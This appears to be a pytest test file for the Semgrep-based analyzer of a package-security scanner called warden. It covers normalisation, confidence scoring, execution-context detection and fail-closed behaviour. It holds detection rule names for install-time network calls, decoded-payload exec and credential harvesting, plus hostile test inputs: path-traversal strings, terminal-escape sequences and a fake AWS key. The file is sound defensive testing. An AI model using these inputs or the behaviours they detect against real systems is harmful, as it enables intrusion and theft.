        ("warden.install_time_execution.setup-network-call", "setup.py", 5),
        ("warden.obfuscation.exec-decoded-payload", "tests/test_hidden.py", 3),
    ]
    for finding in findings:
        assert finding.code == Code.SEMGREP_FINDING
        assert finding.provenance == Provenance.tool("semgrep") == "external-tool:semgrep"
        assert finding.weight == {Severity.high: 5.0, Severity.medium: 2.0, Severity.low: 0.5}[finding.severity]
        if finding.location.line is not None:
            assert finding.location.snippet == source_line(finding.location.file, finding.location.line)
    org, loader, persist, critical, setup, hidden = findings

    assert (loader.severity, loader.confidence, loader.category, loader.capability) == (
        Severity.high, 0.85, Category.OBFUSCATION.value, Capability.OBFUSCATION)
    assert loader.location.column == 9 and loader.location.end_line == 7  # semgrep col 10 → 0-based 9
    assert loader.cwe == ("CWE-506", "CWE-95")
    assert loader.references == ("https://attack.mitre.org/techniques/T1140/",
                                 "https://docs.python.org/3/library/functions.html#exec")
    assert loader.title == "Semgrep rule warden.obfuscation.exec-decoded-payload"
    assert loader.evidence == {
        "rule_id": "warden.obfuscation.exec-decoded-payload", "rule_source": "warden", "semgrep_severity": "ERROR",
        "context": "runtime", "confidence_basis": "rule", "warden_code": Code.ENCODED_EXEC,
        "likelihood": "MEDIUM", "impact": "HIGH",
    }

    assert (persist.confidence, persist.evidence["context"], persist.evidence["confidence_basis"]) == (
        0.85, "import-time", "rule_context")
    assert persist.capability == Capability.PERSISTENCE and persist.category == Category.MALICIOUS_BEHAVIOR.value

    assert (setup.evidence["context"], setup.confidence, setup.capability) == (
        "install-time", 0.75, Capability.INSTALL_EXEC)
    assert (hidden.evidence["context"], hidden.confidence, hidden.evidence["confidence_basis"]) == (
        "test-file", 0.595, "rule_test_file_discount")

    assert (org.severity, org.weight, org.confidence, org.category, org.capability) == (
        Severity.low, 0.5, 0.4, None, None)
    assert org.message == "Organisation rule (fixture): pickle.loads on data that may be untrusted."
    assert org.evidence["rule_source"] == "organisation" and org.evidence["rule_category"] == "security"
    assert org.evidence["nosemgrep_annotated"] is True and org.evidence["likelihood"] == "LOW"
    assert org.cwe == ("CWE-502",) and org.references == ("https://docs.python.org/3/library/pickle.html",)
    assert org.with_defaults(analyzer=sg.ANALYZER_NAME).category == Category.CODE_WEAKNESS.value

    # CRITICAL is capped at high, a missing line stays unknown, pipeline codes are not accepted as hints.
    assert (critical.severity, critical.weight, critical.confidence) == (Severity.high, 5.0, 0.9)
    assert (critical.location.line, critical.location.column, critical.location.end_line) == (None, 4, None)
    assert critical.location.snippet is None and critical.evidence["context"] == "unknown"
    assert "warden_code" not in critical.evidence and critical.capability is None

    stats = scan.stats
    assert stats["tool_version"] == "1.177.0" and stats["results"] == 6
    assert stats["malformed_results"] == 1 and stats["results_truncated"] == 0
    assert stats["rejected_result_paths"] == {"count": 1, "samples": ["<workspace>/../escape.py"]}
    assert stats["errors"]["count"] == 2
    assert stats["errors"]["by_type"] == {"PartialParsing": 1, "Timeout": 1}
    assert stats["errors"]["by_level"] == {"warn": 2}
    partial, timeout = stats["errors"]["samples"]
    assert partial["path"] == "pkg/broken.py" and "<workspace>/pkg/broken.py" in partial["message"]
    assert (timeout["type"], timeout["rule_id"], timeout["path"]) == (
        "Timeout", "warden.malicious_behavior.persistence-write", "pkg/big.py")
    assert root.name not in json.dumps(stats)  # no temporary paths in evidence


def test_normalized_findings_are_deterministic_and_round_trip(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    document = fixture_document(root)
    first = sg.normalize_results(document, root, make_ctx(MALICIOUS_FILES).files).findings
    shuffled = dict(document, results=list(reversed(document["results"])))
    second = sg.normalize_results(shuffled, root, make_ctx(MALICIOUS_FILES).files).findings
    assert [f.finding_id for f in first] == [f.finding_id for f in second]
    for finding in first:
        stamped = finding.with_defaults(analyzer=sg.ANALYZER_NAME, analyzer_version=sg.ANALYZER_VERSION)
        again = Finding.from_dict(json.loads(json.dumps(stamped.to_dict())))
        assert again.finding_id == stamped.finding_id and again.location == stamped.location


def test_unscanned_python_files_are_reported(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    materialised = [*MALICIOUS_FILES, "pkg/generated.py", "README.md", "pkg/data.json"]
    assert sg.unscanned_python_files(fixture_document(root), root, materialised) == ["pkg/generated.py"]
    assert sg.unscanned_python_files({"results": []}, root, materialised) == []  # no paths reported: no claim


def test_line_numbers_are_never_invented(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    document = {"results": [
        result("acme.a", str(root / "a.py"), None),
        {**result("acme.b", str(root / "a.py"), 1), "start": {"line": True, "col": 1}},
        {**result("acme.c", str(root / "a.py"), 1), "start": {"line": -4, "col": 0}},
        {**result("acme.d", str(root / "a.py"), 1), "start": {"line": "3"}},
        result("acme.e", str(root / "a.py"), 99),  # beyond the retained text: keep line, no snippet
    ]}
    findings = sg.normalize_results(document, root, [SourceFile("a.py", "x = 1\n", 6)]).findings
    assert {f.evidence["rule_id"]: f.location.line for f in findings} == {
        "acme.a": None, "acme.b": None, "acme.c": None, "acme.d": None, "acme.e": 99}
    assert all(f.location.snippet is None for f in findings)
    by_rule = {f.evidence["rule_id"]: f for f in findings}
    assert by_rule["acme.c"].location.column is None  # semgrep col 0 is invalid (1-based): not shifted to -1


@pytest.mark.parametrize(("raw", "severity", "weight"), [
    ("ERROR", Severity.high, 5.0),
    ("error", Severity.high, 5.0),
    ("CRITICAL", Severity.high, 5.0),
    ("HIGH", Severity.high, 5.0),
    ("WARNING", Severity.medium, 2.0),
    ("MEDIUM", Severity.medium, 2.0),
    ("INFO", Severity.low, 0.5),
    ("LOW", Severity.low, 0.5),
    ("INVENTORY", Severity.info, 0.0),
    ("EXPERIMENT", Severity.info, 0.0),
    ("\x1b[31mBOGUS", Severity.low, 0.5),
    (None, Severity.low, 0.5),
])
def test_severity_mapping_and_weights(raw, severity, weight):
    assert sg.map_severity(raw) == severity and sg.WEIGHTS[severity] == weight


@pytest.mark.parametrize(("value", "expected"), [
    (0.9, 0.9), (1, 1.0), (0, 0.0), ("0.85", 0.85), (" .5 ", 0.5), ("HIGH", 0.8), ("medium", 0.6), ("Low", 0.4),
    (1.5, None), (-0.1, None), ("1.5", None), ("nan", None), (float("nan"), None), (float("inf"), None),
    (True, None), (None, None), ("", None), ("0.8.1", None), ("1e-1", None), ([0.5], None),
])
def test_parse_confidence(value, expected):
    assert sg.parse_confidence(value) == expected


def test_confidence_precedence_and_test_file_discount():
    md = {"warden_confidence": "0.8", "confidence": "LOW", "warden_confidence_by_context": {"install-time": "0.95"}}
    assert sg.resolve_confidence(md, "install-time") == (0.95, "rule_context")
    assert sg.resolve_confidence(md, "runtime") == (0.8, "rule")
    assert sg.resolve_confidence(md, "test-file") == (0.56, "rule_test_file_discount")
    assert sg.resolve_confidence({"confidence": "LOW"}, "runtime") == (0.4, "rule")
    assert sg.resolve_confidence({"confidence": "bogus"}, "runtime") == (0.5, "default")
    assert sg.resolve_confidence({}, "test-file") == (0.35, "default_test_file_discount")
    explicit = {"warden_confidence": "0.6", "warden_confidence_by_context": {"test-file": "0.5"}}
    assert sg.resolve_confidence(explicit, "test-file") == (0.5, "rule_context")


def test_rule_categories_and_code_hints_are_allowlisted(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    path = str(root / "a.py")
    document = {"results": [
        result("acme.a", path, 1, metadata={"category": "pipeline", "warden_code": "TOOL_UNAVAILABLE"}),
        result("acme.b", path, 2, metadata={"category": "attack_chain", "warden_code": "NOT_A_CODE"}),
        result("acme.c", path, 3, metadata={"category": "credential_access", "warden_code": "ENV_HARVEST"}),
        result("warden.fake.d", path, 4, metadata={"category": ["ioc"], "warden_code": 7}),
    ]}
    a, b, c, d = sg.normalize_results(document, root, []).findings
    assert (a.category, b.category, c.category, d.category) == (None, None, "credential_access", None)
    assert "warden_code" not in a.evidence and "warden_code" not in b.evidence and "warden_code" not in d.evidence
    assert c.evidence["warden_code"] == Code.ENV_HARVEST and c.capability == Capability.ENV_HARVEST
    assert (a.evidence["rule_category"], b.evidence["rule_category"]) == ("pipeline", "attack_chain")
    assert d.evidence["rule_source"] == "warden"  # the id prefix decides the label


def test_hostile_strings_in_tool_output_are_sanitised(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    fake_key = "AKIA" + "Z" * 16
    document = {"results": [result(
        "acme.\x1b[2Jrule", str(root / "pkg" / "evil\u202etxt.py"), 1,
        message=f"leaked {fake_key} \x1b]0;title\x07 \u202ereversed",
        metadata={"references": [f"https://example.invalid/?k={fake_key}"], "likelihood": "\x1b[31mHIGH"},
    )]}
    [finding] = sg.normalize_results(document, root, []).findings
    rendered = json.dumps(finding.to_dict(), ensure_ascii=False)
    for raw in ("\x1b", "\u202e", "\x07", fake_key):
        assert raw not in rendered, repr(raw)


def test_result_cap_is_enforced_and_reported(tmp_path, monkeypatch):
    monkeypatch.setattr(sg, "MAX_RESULTS", 3)
    root = tmp_path / "ws"
    root.mkdir()
    document = {"results": [result(f"acme.r{i}", str(root / "a.py"), i + 1) for i in range(10)]}
    scan = sg.normalize_results(document, root, [])
    assert len(scan.findings) == 3 and scan.stats["results_truncated"] == 7
    status = sg.scan_status_finding(scan.stats)
    assert status is not None and "7 result(s) beyond the 3-result cap dropped" in status.message


def test_scan_status_finding_is_absent_when_the_scan_was_complete(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    scan = sg.normalize_results({"results": [], "errors": []}, root, [])
    assert sg.scan_status_finding(scan.stats, control_files_removed=3) is None


# =========================================================================== result paths
def test_normalize_result_path_accepts_only_paths_inside_the_workspace(tmp_path):
    root = tmp_path / "ws"
    (root / "pkg").mkdir(parents=True)
    (tmp_path / "ws-evil").mkdir()
    assert sg.normalize_result_path(str(root / "pkg" / "a.py"), root) == "pkg/a.py"
    assert sg.normalize_result_path("pkg/a.py", root) == "pkg/a.py"
    assert sg.normalize_result_path("pkg\\a.py", root) == "pkg/a.py"
    assert sg.normalize_result_path(str(root) + "/pkg/./b.py", root) == "pkg/b.py"
    for bad in (
        str(tmp_path / "outside.py"),
        str(root / ".." / "outside.py"),
        "../outside.py",
        "pkg/../../outside.py",
        str(tmp_path / "ws-evil" / "x.py"),
        str(root),
        "",
        None,
        42,
        "pkg/\x00a.py",
        "x" * 5000,
        "\\rooted.py",
        "/etc/passwd" if IS_WINDOWS else "C:relative.py",
    ):
        assert sg.normalize_result_path(bad, root) is None, repr(bad)


@pytest.mark.skipif(not IS_WINDOWS, reason="drive letters and UNC paths are Windows-specific")
def test_normalize_result_path_rejects_other_drives_and_unc(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    other_drive = "Y:" if str(root)[:1].upper() != "Y" else "X:"
    assert sg.normalize_result_path(f"{other_drive}\\pkg\\a.py", root) is None
    assert sg.normalize_result_path("\\\\server\\share\\pkg\\a.py", root) is None


# =========================================================================== execution context
CONTEXT_SRC = (
    "import os\n"                          # 1
    "\n"                                   # 2
    "@decorate(os.system(cmd))\n"          # 3  decorator: import time
    "def handler(arg=os.popen(cmd)):\n"    # 4  default value: import time
    "    os.system(arg)\n"                 # 5  function body: runtime
    "\n"                                   # 6
    "class Plugin:\n"                      # 7
    "    hook = os.system(cmd)\n"          # 8  class body: import time
    "\n"                                   # 9
    "    def run(self):\n"                 # 10
    "        return os.system(cmd)\n"      # 11 method body: runtime
    "\n"                                   # 12
    "callback = lambda: os.system(cmd)\n"  # 13 lambda body: runtime
    "os.system(cmd)\n"                     # 14 module level: import time
)


def test_execution_context_is_derived_from_the_ast(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    lines = {3: "import-time", 4: "import-time", 5: "runtime", 8: "import-time", 11: "runtime", 13: "runtime",
             14: "import-time"}
    document = {"results": [result(f"acme.l{line}", str(root / "pkg" / "mod.py"), line) for line in lines]}
    findings = sg.normalize_results(document, root, [SourceFile("pkg/mod.py", CONTEXT_SRC, len(CONTEXT_SRC))]).findings
    assert {f.location.line: f.evidence["context"] for f in findings} == lines


@pytest.mark.parametrize(("relpath", "context"), [
    ("tests/test_mod.py", "test-file"),
    ("pkg/tests/helpers.py", "test-file"),
    ("pkg/test_mod.py", "test-file"),
    ("pkg/mod_test.py", "test-file"),
    ("conftest.py", "test-file"),
    ("setup.py", "install-time"),
    ("vendor/lib/setup.py", "install-time"),
    ("pkg/testing_utils.py", "import-time"),
    ("pkg/data.yaml", "unknown"),
    ("pkg/bomb_memory.py", "unknown"),
    ("pkg/bomb_recursion.py", "unknown"),
    ("pkg/broken.py", "unknown"),
    ("pkg/not_retained.py", "unknown"),
])
def test_execution_context_from_path_and_unparseable_files(tmp_path, relpath, context):
    root = tmp_path / "ws"
    root.mkdir()
    sources = {
        "tests/test_mod.py": "x = 1\n", "pkg/tests/helpers.py": "x = 1\n", "pkg/test_mod.py": "x = 1\n",
        "pkg/mod_test.py": "x = 1\n", "conftest.py": "x = 1\n", "setup.py": "x = 1\n",
        "vendor/lib/setup.py": "x = 1\n", "pkg/testing_utils.py": "x = 1\n", "pkg/data.yaml": "x: 1\n",
        "pkg/bomb_memory.py": "-" * 200_000 + "1\n", "pkg/bomb_recursion.py": "a" + ".b" * 200_000 + "\n",
        "pkg/broken.py": "def broken(:\n    pass\n",
    }
    document = {"results": [result("acme.ctx", str(root / relpath), 1)]}
    files = [SourceFile(rel, text, len(text)) for rel, text in sources.items()]
    [finding] = sg.normalize_results(document, root, files).findings
    assert finding.evidence["context"] == context


# =========================================================================== JSON parsing
@pytest.mark.parametrize("stdout", [
    "",
    "Traceback (most recent call last):\n  ValueError: Invalid YAML tree structure",
    "[]",
    '{"errors": []}',
    '{"results": {}}',
    '{"results": [], "errors": {}}',
    "[" * 100_000,
    '{"results": [' + "1," * 10 + "]",
], ids=["empty", "traceback", "list", "no-results", "results-not-list", "errors-not-list", "deep-nesting",
        "truncated"])
def test_malformed_semgrep_json_is_rejected(stdout):
    with pytest.raises(sg.SemgrepOutputError):
        sg.parse_semgrep_json(stdout)


def test_config_error_document_parses_but_is_not_a_scan(tmp_path):
    document = sg.parse_semgrep_json(fixture_text("semgrep_config_error.json", tmp_path))
    assert document["results"] == [] and len(document["errors"]) == 2


# =========================================================================== analyzer
def test_disabled_semgrep_is_unavailable_and_never_probed_or_run(monkeypatch):
    monkeypatch.setattr(sg, "find_tool", lambda *a, **k: pytest.fail("must not probe a disabled tool"))
    monkeypatch.setattr(sg, "run_tool", lambda *a, **k: pytest.fail("must not run a disabled tool"))
    monkeypatch.setattr(settings, "SEMGREP_ENABLED", False)
    analyzer = sg.SemgrepAnalyzer()
    status = analyzer.availability()
    assert status.available is False and "SEMGREP_ENABLED" in status.detail and status.name == "semgrep"
    [finding] = analyzer.analyze(make_ctx({"pkg/a.py": "x = 1\n"}))
    assert (finding.code, finding.severity, finding.weight) == (Code.TOOL_UNAVAILABLE, Severity.info, 0.0)


def test_missing_semgrep_binary_is_unavailable(monkeypatch):
    clear_tool_cache()
    monkeypatch.setattr(sg, "run_tool", lambda *a, **k: pytest.fail("must not run"))
    try:
        analyzer = sg.SemgrepAnalyzer(binary="warden-definitely-missing-semgrep-xyz", enabled=True)
        status = analyzer.availability()
        assert (status.available, status.detail, status.name) == (False, "not found on PATH", "semgrep")
        [finding] = analyzer.analyze(make_ctx({"pkg/a.py": "x = 1\n"}))
        assert finding.code == Code.TOOL_UNAVAILABLE and finding.evidence["detail"] == "not found on PATH"
    finally:
        clear_tool_cache()


def test_analyzer_identity_matches_the_risk_engine_contract():
    from app.analysis.risk import DIMENSION_ANALYZERS

    analyzer = sg.SemgrepAnalyzer()
    assert (analyzer.name, analyzer.version, analyzer.requires_network) == ("semgrep_scan", "1.0.0", False)
    assert analyzer.name in DIMENSION_ANALYZERS["behavioral"]
    assert sg.PACKAGED_RULES.is_file()
    assert taxonomy.get(sg.SEMGREP_SCAN_INCOMPLETE).category == Category.PIPELINE.value


def test_analyze_materialises_safely_runs_semgrep_and_normalises(tmp_path, monkeypatch, tool_available):
    files = {**MALICIOUS_FILES, **HOSTILE_CONTROL_FILES, "pkg/generated.py": "VALUE = 1\n"}
    runner = FakeRunner(lambda ws: ToolResult(0, fixture_text("semgrep_results.json", ws), "", False, 1200, False))
    monkeypatch.setattr(sg, "run_tool", runner)
    analyzer = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, timeout_seconds=42, workspace_base_dir=tmp_path)
    findings = analyzer.analyze(make_ctx(files))

    [call] = runner.calls
    workspace = call["workspace"]
    assert call["ignore"] == sg.IGNORE_FILE_CONTENT
    assert call["files"] == sorted([*MALICIOUS_FILES, "pkg/generated.py", ".semgrepignore"])
    assert call["argv"][:3] == ["semgrep", "scan", f"--config={sg.PACKAGED_RULES}"]
    assert call["argv"][-1] == str(workspace) and f"--project-root={workspace}" in call["argv"]
    assert 41.0 < call["timeout"] <= 42.0 and Path(call["cwd"]) == workspace  # what is left of the budget
    assert call["contents"]["pkg/cr_loader.py"] == MALICIOUS_FILES["pkg/cr_loader.py"].replace("\r", "\n").encode()
    assert call["extra_env"] == sg.tool_env()
    assert workspace.parent == tmp_path and not workspace.exists()  # removed after the scan

    assert [f.code for f in findings] == [Code.SEMGREP_FINDING] * 6 + [sg.SEMGREP_SCAN_INCOMPLETE]
    status = findings[-1]
    assert (status.severity, status.weight, status.confidence) == (Severity.info, 0.0, 1.0)
    assert status.evidence["errors"]["count"] == 2
    assert status.evidence["unscanned_python_files"] == {"count": 1, "samples": ["pkg/generated.py"]}
    assert status.evidence["control_files_removed"] == 4
    assert status.evidence["rejected_result_paths"]["count"] == 1 and status.evidence["malformed_results"] == 1
    assert status.evidence["refused_configs"] == []
    assert workspace.name not in json.dumps([f.to_dict() for f in findings])

    again = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, workspace_base_dir=tmp_path).analyze(make_ctx(files))
    assert [f.finding_id for f in again] == [f.finding_id for f in findings]  # stateless and deterministic


def test_refused_organisational_configs_are_reported_and_valid_ones_used(tmp_path, monkeypatch, tool_available):
    root = tmp_path / "org"
    root.mkdir()
    good = root / "acme.yml"
    good.write_text("rules: []\n", encoding="utf-8")
    empty_scan = json.dumps({"version": "1.177.0", "results": [], "errors": []})
    runner = FakeRunner(lambda ws: ToolResult(0, empty_scan, "", False, 10, False))
    monkeypatch.setattr(sg, "run_tool", runner)
    analyzer = sg.SemgrepAnalyzer(
        binary="semgrep", enabled=True, workspace_base_dir=tmp_path, allowed_config_roots=[str(root)],
        extra_configs=["p/python", "https://rules.example.invalid/x.yml", str(good), str(tmp_path / "missing.yml")],
    )
    findings = analyzer.analyze(make_ctx({"pkg/shell.py": MALICIOUS_FILES["pkg/shell.py"]}))
    argv = runner.calls[0]["argv"]
    assert [a for a in argv if a.startswith("--config=")] == [f"--config={sg.PACKAGED_RULES}",
                                                              f"--config={os.path.realpath(good)}"]
    assert not any("p/python" in a or "example.invalid" in a for a in argv)
    [status] = findings
    assert status.code == sg.SEMGREP_SCAN_INCOMPLETE
    assert [c["reason"] for c in status.evidence["refused_configs"]] == [
        "registry_reference", "remote_url", "not_found"]


def test_default_settings_allowlist_no_config_roots(tmp_path, monkeypatch, tool_available):
    rules_file = tmp_path / "acme.yml"
    rules_file.write_text("rules: []\n", encoding="utf-8")
    monkeypatch.setattr(settings, "SEMGREP_EXTRA_CONFIGS", [str(rules_file)])
    runner = FakeRunner(lambda ws: ToolResult(0, '{"results": [], "errors": []}', "", False, 10, False))
    monkeypatch.setattr(sg, "run_tool", runner)
    analyzer = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, workspace_base_dir=tmp_path)
    if analyzer.allowed_config_roots():
        pytest.skip("SEMGREP_CONFIG_ROOTS is configured in this environment")
    [status] = analyzer.analyze(make_ctx({"pkg/a.py": "x = 1\n"}))
    assert status.evidence["refused_configs"][0]["reason"] == "no_allowed_roots"
    assert [a for a in runner.calls[0]["argv"] if a.startswith("--config=")] == [f"--config={sg.PACKAGED_RULES}"]


@pytest.mark.parametrize(("tool_result", "error"), [
    (ToolResult(None, "", "", True, 60_000, False), sg.SemgrepTimeoutError),
    (ToolResult(0, '{"results": [', "", False, 10, True), sg.SemgrepOutputError),
    (ToolResult(0, "", "Traceback (most recent call last): ScalarFloat", False, 10, False), sg.SemgrepOutputError),
    (ToolResult(0, "not json at all", "", False, 10, False), sg.SemgrepOutputError),
    (ToolResult(2, '{"results": [], "errors": [{"level": "error", "type": "Rule parse error"}]}',
                "Traceback: secret-ish tool output", False, 10, False), sg.SemgrepExecutionError),
    (ToolResult(7, "__CONFIG_ERROR__", "", False, 10, False), sg.SemgrepExecutionError),
    (ToolResult(None, "", "", False, 10, False), sg.SemgrepExecutionError),
    (ToolResult(3, '{"results": [{"check_id": "x"}], "errors": []}', "", False, 10, False),
     sg.SemgrepExecutionError),
])
def test_semgrep_failures_raise_so_the_orchestrator_fails_closed(tmp_path, monkeypatch, tool_available,
                                                                 tool_result, error):
    def respond(ws):
        if tool_result.stdout == "__CONFIG_ERROR__":
            return ToolResult(tool_result.returncode, fixture_text("semgrep_config_error.json", ws), "", False, 10,
                              False)
        return tool_result

    runner = FakeRunner(respond)
    monkeypatch.setattr(sg, "run_tool", runner)
    analyzer = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, workspace_base_dir=tmp_path)
    with pytest.raises(error) as excinfo:
        analyzer.analyze(make_ctx({"pkg/a.py": "x = 1\n"}))
    assert "Traceback" not in str(excinfo.value) and "secret" not in str(excinfo.value)
    assert not runner.calls[0]["workspace"].exists()
    if error is sg.SemgrepTimeoutError:
        assert isinstance(excinfo.value, TimeoutError)


def test_packages_without_scannable_files_do_not_run_semgrep(tmp_path, monkeypatch, tool_available):
    monkeypatch.setattr(sg, "run_tool", lambda *a, **k: pytest.fail("nothing to scan"))
    analyzer = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, workspace_base_dir=tmp_path)
    assert analyzer.analyze(make_ctx({})) == []
    assert analyzer.analyze(make_ctx(HOSTILE_CONTROL_FILES)) == []


def test_lone_carriage_returns_are_normalised_so_lines_and_context_agree(tmp_path, monkeypatch, tool_available):
    source = "import os\rdef f():\r    pass\ros.system(x)\r\nos.system(y)\n"
    # Semgrep sees the normalised file, so its line 4 is Python's line 4 (module level, import time).
    runner = FakeRunner(lambda ws: ToolResult(0, json.dumps({"results": [
        result("acme.system", str(ws / "pkg" / "cr.py"), 4), result("acme.system", str(ws / "pkg" / "cr.py"), 5),
    ], "errors": []}), "", False, 10, False))
    monkeypatch.setattr(sg, "run_tool", runner)
    findings = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, workspace_base_dir=tmp_path).analyze(
        make_ctx({"pkg/cr.py": source}))
    assert runner.calls[0]["contents"]["pkg/cr.py"] == b"import os\ndef f():\n    pass\nos.system(x)\r\nos.system(y)\n"
    assert [(f.location.line, f.location.snippet, f.evidence["context"]) for f in findings] == [
        (4, "os.system(x)", "import-time"), (5, "os.system(y)", "import-time")]


def test_normalise_line_endings_keeps_crlf_and_length():
    crlf = SourceFile("a.py", "a = 1\r\nb = 2\r\n", 14)
    assert sg.normalise_line_endings(crlf) is crlf
    mixed = SourceFile("a.py", "a = 1\rb = 2\r\n\r", 14, truncated=True, sha256="00")
    out = sg.normalise_line_endings(mixed)
    assert out.text == "a = 1\nb = 2\r\n\n" and len(out.text) == len(mixed.text)
    assert (out.relpath, out.size, out.truncated, out.sha256) == ("a.py", 14, True, "00")
    assert mixed.text == "a = 1\rb = 2\r\n\r"  # the package context is never mutated


def test_context_is_unknown_when_unnormalised_text_has_lone_carriage_returns(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    document = {"results": [result("acme.cr", str(root / "pkg" / "cr.py"), 1)]}
    raw = SourceFile("pkg/cr.py", "def f():\r    pass\ros.system(x)\n", 30)
    [finding] = sg.normalize_results(document, root, [raw]).findings
    assert finding.evidence["context"] == "unknown"


def test_default_time_budget_leaves_headroom_below_the_orchestrator_timeout(monkeypatch):
    monkeypatch.setattr(settings, "TOOL_TIMEOUT_SECONDS", 120)
    monkeypatch.setattr(settings, "ANALYZER_TIMEOUT_SECONDS", 60)
    assert sg.SemgrepAnalyzer().timeout_seconds() == 54.0
    monkeypatch.setattr(settings, "ANALYZER_TIMEOUT_SECONDS", 20)
    assert sg.SemgrepAnalyzer().timeout_seconds() == 17.0
    monkeypatch.setattr(settings, "TOOL_TIMEOUT_SECONDS", 10)
    assert sg.SemgrepAnalyzer().timeout_seconds() == 10.0
    monkeypatch.setattr(settings, "ANALYZER_TIMEOUT_SECONDS", 2)
    assert sg.SemgrepAnalyzer().timeout_seconds() == 1.0


def test_exhausted_time_budget_raises_before_running_semgrep(tmp_path, monkeypatch, tool_available):
    ticks = iter(range(0, 10_000, 100))

    class _Clock:
        @staticmethod
        def monotonic() -> float:
            return float(next(ticks))

    monkeypatch.setattr(sg, "time", _Clock)
    monkeypatch.setattr(sg, "run_tool", lambda *a, **k: pytest.fail("no budget left: must not run"))
    analyzer = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, timeout_seconds=42, workspace_base_dir=tmp_path)
    with pytest.raises(sg.SemgrepTimeoutError):
        analyzer.analyze(make_ctx({"pkg/a.py": "x = 1\n"}))
    assert list(tmp_path.iterdir()) == []  # workspace removed


def test_pathlike_configs_returning_bytes_are_refused(tmp_path):
    class BytesPath(os.PathLike):
        def __fspath__(self):
            return os.fsencode(str(tmp_path / "rules.yml"))

    (tmp_path / "rules.yml").write_text("rules: []\n", encoding="utf-8")
    accepted, refused = sg.resolve_extra_configs([BytesPath()], [str(tmp_path)])
    assert accepted == [] and [d.reason for d in refused] == ["invalid_type"]
    # A bytes-returning PathLike is never trusted as an allowlisted root either.
    accepted, refused = sg.resolve_extra_configs([str(tmp_path / "rules.yml")], [BytesPath()])
    assert accepted == [] and [d.reason for d in refused] == ["no_allowed_roots"]


def test_missing_packaged_rules_fail_closed(tmp_path, monkeypatch, tool_available):
    monkeypatch.setattr(sg, "run_tool", lambda *a, **k: pytest.fail("must not run without rules"))
    analyzer = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, rules_path=tmp_path / "missing.yml")
    with pytest.raises(sg.SemgrepError):
        analyzer.analyze(make_ctx({"pkg/a.py": "x = 1\n"}))


# =========================================================================== orchestrator integration
class _Fetcher:
    def __init__(self, files: dict[str, str]):
        self.files = files

    def build_context(self, name, version, options=None):
        return make_ctx(self.files)


class _NoCache:
    def get_json(self, key):
        return None

    def set_json(self, key, value, ttl):
        return None


def test_orchestrator_reports_unavailable_semgrep_without_fake_findings():
    from app.analysis.orchestrator import Orchestrator

    clear_tool_cache()
    try:
        analyzer = sg.SemgrepAnalyzer(binary="warden-definitely-missing-semgrep-xyz", enabled=True)
        out = Orchestrator(_Fetcher({"pkg/a.py": "x = 1\n"}), analyzers=[analyzer],
                           cache_backend=_NoCache()).analyze("pypi", "demo", "1.0.0")
    finally:
        clear_tool_cache()
    [run] = [r for r in out.analyzer_runs if r["name"] == "semgrep_scan"]
    assert run["status"] == "unavailable"
    [status] = [s for s in out.signals if s["code"] == Code.TOOL_UNAVAILABLE]
    assert (status["severity"], status["weight"], status["evidence"]["tool"]) == ("info", 0.0, "semgrep")
    assert not any(s["code"] == Code.SEMGREP_FINDING for s in out.signals)


def test_orchestrator_turns_a_semgrep_timeout_into_analyzer_error(tmp_path, monkeypatch, tool_available):
    from app.analysis.orchestrator import Orchestrator

    monkeypatch.setattr(sg, "run_tool", lambda *a, **k: ToolResult(None, "", "", True, 60_000, False))
    analyzer = sg.SemgrepAnalyzer(binary="semgrep", enabled=True, workspace_base_dir=tmp_path)
    out = Orchestrator(_Fetcher({"pkg/a.py": "x = 1\n"}), analyzers=[analyzer],
                       cache_backend=_NoCache()).analyze("pypi", "demo", "1.0.0")
    [error] = [s for s in out.signals if s["code"] == Code.ANALYZER_ERROR]
    assert error["evidence"] == {"analyzer": "semgrep_scan", "status": "error", "error_type": "SemgrepTimeoutError"}
    assert [r["status"] for r in out.analyzer_runs if r["name"] == "semgrep_scan"] == ["error"]


# =========================================================================== real semgrep (opt-in)
SEMGREP_UNDER_TEST = os.environ.get("WARDEN_TEST_SEMGREP")
real_semgrep = pytest.mark.skipif(not SEMGREP_UNDER_TEST,
                                  reason="set WARDEN_TEST_SEMGREP to a semgrep binary to run the packaged rules")


@pytest.fixture(scope="module")
def real_scans(tmp_path_factory):
    analyzer = sg.SemgrepAnalyzer(binary=SEMGREP_UNDER_TEST, enabled=True, timeout_seconds=900,
                                  workspace_base_dir=tmp_path_factory.mktemp("semgrep-real"))
    return {
        "malicious": analyzer.analyze(make_ctx({**MALICIOUS_FILES, **HOSTILE_CONTROL_FILES})),
        "benign": analyzer.analyze(make_ctx(BENIGN_FILES)),
    }


@real_semgrep
def test_real_semgrep_packaged_rules_fire_on_malicious_samples(real_scans):
    findings = real_scans["malicious"]
    assert all(f.code == Code.SEMGREP_FINDING for f in findings), [f.message for f in findings]
    hits = {(f.evidence["rule_id"], f.location.file, f.location.line) for f in findings}
    assert hits == EXPECTED_MALICIOUS_HITS
    contexts = {(f.location.file, f.location.line): f.evidence["context"] for f in findings}
    assert contexts[("pkg/loader.py", 7)] == "runtime"
    assert contexts[("pkg/persist.py", 3)] == "import-time"
    assert contexts[("setup.py", 5)] == "install-time"
    assert contexts[("tests/test_hidden.py", 3)] == "test-file"


@real_semgrep
def test_real_semgrep_packaged_rules_stay_silent_on_benign_code(real_scans):
    assert [(f.evidence.get("rule_id"), f.location and f.location.file, f.location and f.location.line)
            for f in real_scans["benign"]] == []
